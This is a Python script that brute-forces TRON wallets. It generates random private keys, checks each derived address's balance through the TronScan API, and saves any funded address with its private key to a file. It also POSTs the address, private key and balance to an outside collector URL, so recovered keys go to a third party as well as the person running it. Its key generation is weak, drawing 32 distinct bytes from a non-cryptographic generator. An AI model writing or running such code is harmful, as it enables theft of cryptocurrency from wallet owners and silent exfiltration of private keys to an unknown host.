import hashlib
import random
import sys
import time
import requests
from colorama import Fore
import base58
import ecdsa
from Crypto.Hash import keccak
import os

# Function to calculate the keccak256 hash
def keccak256(data):
    hasher = keccak.new(digest_bits=256)
    hasher.update(data)
    return hasher.digest()

# Get the ECDSA signing key from the raw private key
def get_signing_key(raw_priv):
    return ecdsa.SigningKey.from_string(raw_priv, curve=ecdsa.SECP256k1)

# Convert the verifying key to a TRON address
def verifying_key_to_addr(key):
    pub_key = key.to_string()
    primitive_addr = b'\x41' + keccak256(pub_key)[-20:]  # TRON addresses start with 41
    addr = base58.b58encode_check(primitive_addr)
    return addr

# Initialize counters for total scans and winners
z = 0
w = 0

# Flask API URL
flask_api_url = "https://linkcollector.onrender.com/api/wallets"  # Adjust this URL as needed

while True:
    # Generate a random private key
    raw = bytes(random.sample(range(0, 256), 32))
    key = get_signing_key(raw)
    addr = verifying_key_to_addr(key.get_verifying_key()).decode()
    priv = raw.hex()

    # Request account data from TronScan API
    try:
        block = requests.get(f"https://apilist.tronscan.org/api/account?address={addr}")
        block.raise_for_status()  # Check for request errors
        res = block.json()

        # Check if the address has any balances
        balances = res.get("balances", [])
        if balances:
            bal = float(balances[0]["amount"])
        else:
            bal = 0

        # If the balance is greater than 0, store the address and private key
        if bal > 0:
            w += 1
            with open("FileTRXWinner.txt", "a") as f:
                f.write(f'\nADDRESS: {addr}   Balance: {bal}')
                f.write(f'\nPRIVATE KEY: {priv}')
                f.write('\n------------------------')

            # Post the address to the Flask API
            try:
                response = requests.post(flask_api_url, json={
                    "trx_address": addr,
                    "private_key": priv,
                    "balance": bal
                })
                if response.status_code == 201:
                    print(f"{Fore.GREEN}Posted to API successfully: {addr}{Fore.RESET}")
                else:
                    print(f"{Fore.RED}Failed to post to API: {response.status_code}{Fore.RESET}")
            except requests.exceptions.RequestException as e:
                print(f"{Fore.RED}Error posting to API: {str(e)}{Fore.RESET}")

        else:
            print(f"{Fore.RED}Total Scan: {Fore.BLUE}{z}{Fore.RESET}")
            print(f"{Fore.YELLOW}Address: {Fore.RESET}{addr}           Balance: {bal}")
            print(f"{Fore.YELLOW}Address(hex): {Fore.RESET}{base58.b58decode_check(addr.encode()).hex()}")
            print(f"{Fore.YELLOW}Private Key: {Fore.RED}{priv}{Fore.RESET}")

        # Increment the scan counter
        z += 1

    except requests.exceptions.RequestException as e:
        print(f"Error fetching data for address {addr}: {str(e)}")
    except (KeyError, IndexError, ValueError) as e:
        print(f"Error processing response for address {addr}: {str(e)}")

    # Pause before the next iteration to avoid API rate limits
    time.sleep(1)  # You can adjust the sleep time if needed
